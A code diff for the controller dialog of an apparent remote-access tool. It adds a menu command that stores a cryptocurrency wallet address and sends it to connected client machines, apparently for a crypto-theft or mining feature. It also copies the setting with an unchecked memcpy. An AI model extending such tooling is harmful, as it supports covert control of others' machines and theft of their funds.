@@ -39,6 +39,8 @@
 #include "client/MemoryModule.h"
 #include <file/CFileManagerDlg.h>
 #include "CDrawingBoard.h"
+#include "CWalletDlg.h"
+#include <wallet.h>
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -474,6 +476,7 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
 	ON_COMMAND(ID_ONLINE_ADD_WATCH, &CMy2015RemoteDlg::OnOnlineAddWatch)
 	ON_NOTIFY(NM_CUSTOMDRAW, IDC_ONLINE, &CMy2015RemoteDlg::OnNMCustomdrawOnline)
 	ON_COMMAND(ID_ONLINE_RUN_AS_ADMIN, &CMy2015RemoteDlg::OnOnlineRunAsAdmin)
+	ON_COMMAND(ID_MAIN_WALLET, &CMy2015RemoteDlg::OnMainWallet)
 END_MESSAGE_MAP()
 
 
@@ -1052,6 +1055,8 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
 	int n = THIS_CFG.GetInt("settings", "SoftwareDetect");
 	int usingFRP = master.empty() ? 0 : THIS_CFG.GetInt("frp", "UseFrp");
 	m_settings = { m, sizeof(void*) == 8, __DATE__, n, usingFRP };
+	auto w = THIS_CFG.GetStr("settings", "wallet", "");
+	memcpy(m_settings.WalletAddress, w.c_str(), w.length());
 	std::map<int, std::string> myMap = {{SOFTWARE_CAMERA, "摄像头"}, {SOFTWARE_TELEGRAM, "电报" }};
 	std::string str = myMap[n];
 	LVCOLUMN lvColumn;
@@ -3283,4 +3288,20 @@ void CMy2015RemoteDlg::OnOnlineRunAsAdmin()
 		}
 		LeaveCriticalSection(&m_cs);
 	}
+}
+
+
+void CMy2015RemoteDlg::OnMainWallet()
+{
+	CWalletDlg dlg(this);
+	dlg.m_str = CString(m_settings.WalletAddress);
+	if (dlg.DoModal() != IDOK || CString(m_settings.WalletAddress) == dlg.m_str)
+		return;
+	if (dlg.m_str.GetLength() > 470) {
+		MessageBox("超出钱包地址可输入的字符数限制!", "提示", MB_ICONINFORMATION);
+		return;
+	}
+	strcpy(m_settings.WalletAddress, dlg.m_str);
+	THIS_CFG.SetStr("settings", "wallet", m_settings.WalletAddress);
+	SendMasterSettings(nullptr);
 }
